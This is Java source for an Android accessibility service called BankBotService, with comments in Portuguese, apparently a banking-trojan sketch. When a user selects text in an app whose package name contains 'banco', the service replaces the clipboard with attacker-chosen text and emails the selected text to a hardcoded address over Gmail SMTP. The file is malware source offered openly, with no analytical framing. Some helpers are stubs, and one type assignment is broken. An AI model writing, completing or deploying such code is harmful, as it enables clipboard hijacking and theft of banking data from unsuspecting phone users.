import android.accessibilityservice.AccessibilityService;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.util.Properties;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class BankBotService extends AccessibilityService {

    private static final String TAG = "BankBotService";
    private static final String EMAIL = "seu_email@gmail.com";
    private static final String SENHA = "sua_senha";
    private static final String DESTINATARIO_EMAIL = "email_destinatario@gmail.com";
    private static final String TEXTO_SUBSTITUTO = "Texto substituto pelo atacante";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
            CharSequence selectedText = event.getText().toString();
            if (selectedText != null && !selectedText.toString().isEmpty()) {
                String appName = getAppName(event.getPackageName().toString());
                if (isBankApp(appName)) {
                    // Substitui o texto copiado pelo texto fornecido pelo atacante
                    replaceCopiedText(selectedText.toString());
                    sendEmail(selectedText.toString(), appName);
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.e(TAG, "BankBot interrompido.");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "BankBot conectado.");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "BankBot destruído.");
    }

    private String getAppName(String packageName) {
        // Implemente a lógica para obter o nome do aplicativo a partir do seu pacote
        return packageName;
    }

    private boolean isBankApp(String appName) {
        // Implemente a lógica para verificar se o aplicativo é um aplicativo bancário
        return appName.toLowerCase().contains("banco");
    }

    private void replaceCopiedText(String selectedText) {
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText("label", TEXTO_SUBSTITUTO);
        clipboard.setPrimaryClip(clip);
    }

    private void sendEmail(final String content, final String appName) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                // Configuração das propriedades do servidor de e-mail
                Properties props = new Properties();
                props.put("mail.smtp.auth", "true");
                props.put("mail.smtp.starttls.enable", "true");
                props.put("mail.smtp.host", "smtp.gmail.com");
                props.put("mail.smtp.port", "587");

                // Criação da sessão de e-mail com autenticação
                Session session = Session.getInstance(props,
                        new Authenticator() {
                            @Override
                            protected PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication(EMAIL, SENHA);
                            }
                        });

                try {
                    // Criação da mensagem de e-mail
                    Message message = new MimeMessage(session);
                    message.setFrom(new InternetAddress(EMAIL));
                    message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(DESTINATARIO_EMAIL));
                    message.setSubject("Logs do BankBot");
                    message.setText("Texto copiado do " + appName + ":\n" + content);

                    // Envio da mensagem de e-mail
                    Transport.send(message);

                    Log.d(TAG, "E-mail enviado com sucesso.");
                } catch (MessagingException e) {
                    Log.e(TAG, "Erro ao enviar e-mail: " + e.getMessage());
                }
            }
        }).start();
    }
}
